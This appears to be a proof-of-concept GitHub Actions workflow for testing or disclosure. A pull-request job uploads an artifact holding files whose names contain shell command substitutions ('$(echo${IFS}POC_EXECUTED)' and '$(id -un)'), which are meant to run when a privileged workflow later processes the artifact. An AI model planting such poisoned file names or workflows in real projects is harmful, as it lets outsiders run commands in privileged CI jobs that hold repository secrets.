name: Test

on:
  pull_request:

jobs:
  publish-content:
    runs-on: ubuntu-latest
    steps:
      - name: Craft artifact (attacker-controlled PR head)
        run: |
          mkdir -p /tmp/content
          echo "${{ github.event.number }}" > /tmp/content/pr_number.txt
          # Companion file: after the privileged shell evaluates the payload
          # filename below, the path resolves to this file.
          echo "POC-COMPANION-CONTENT-VIA-EXPANDED-FILENAME" > /tmp/content/zPOC_EXECUTEDb.txt
          # Payload A: `${IFS}` substitution resolves to zPOC_EXECUTEDb.txt
          printf 'PAYLOAD-LITERAL-FILE\n' > '/tmp/content/z$(echo${IFS}POC_EXECUTED)b.txt'
          # Payload B: id -un output is embedded in the cat path (log proof)
          touch '/tmp/content/a$(id -un)b.txt'
      - uses: actions/upload-artifact@v4
        with:
          name: content-default
          path: /tmp/content
